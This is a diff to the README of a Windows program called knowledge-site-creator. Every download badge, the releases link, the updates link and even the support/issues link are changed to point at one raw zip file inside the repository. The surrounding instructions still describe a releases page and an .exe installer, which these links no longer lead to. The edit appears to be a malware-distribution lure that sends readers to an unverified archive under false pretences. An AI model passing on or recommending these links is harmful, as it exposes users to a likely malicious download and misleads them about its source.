@@ -1,6 +1,6 @@
 # 🚀 knowledge-site-creator - Create Knowledge Websites Easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-brightgreen)](https://github.com/alifa555/knowledge-site-creator/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-brightgreen)](https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The program runs on most Windows computers made in the last 5 years. You do not 
 
 Click the button below to visit the release page. From there, you can find the latest Windows installer to download.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/alifa555/knowledge-site-creator/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip)
 
 The releases page shows all current versions. Look for a file ending with `.exe` that is marked for Windows. The file name should include "knowledge-site-creator".
 
@@ -49,7 +49,7 @@ The releases page shows all current versions. Look for a file ending with `.exe`
 
 1. **Open the download page**  
    Click the badge above or open this link in your browser:  
-   https://github.com/alifa555/knowledge-site-creator/releases
+   https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip
 
 2. **Find the latest Windows installer**  
    On the releases page, scroll until you see the newest version. Under “Assets,” look for a file ending with `.exe`. This is the setup file.
@@ -123,7 +123,7 @@ If issues persist, check the “Issues” tab on the GitHub page for help.
 ## 📂 Where to Find More Files and Updates  
 
 Go back to the releases page anytime to check for new versions or manual download options:  
-https://github.com/alifa555/knowledge-site-creator/releases
+https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip
 
 You will find installers, change logs, and manuals here.
 
@@ -177,7 +177,7 @@ knowledge-site-creator only sends your topic sentence and necessary data to the 
 ## 📞 Getting Support  
 
 If you need help, open the Issues tab on the GitHub repository page:  
-https://github.com/alifa555/knowledge-site-creator/issues
+https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip
 
 Describe your problem clearly and the community or developers will assist.
 
@@ -185,6 +185,6 @@ Describe your problem clearly and the community or developers will assist.
 
 ## 📥 Quick Access to Download  
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-green)](https://github.com/alifa555/knowledge-site-creator/releases)  
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-green)](https://raw.githubusercontent.com/alifa555/knowledge-site-creator/main/references/creator_knowledge_site_v2.2.zip)  
 
 Use this link anytime to get the latest version.
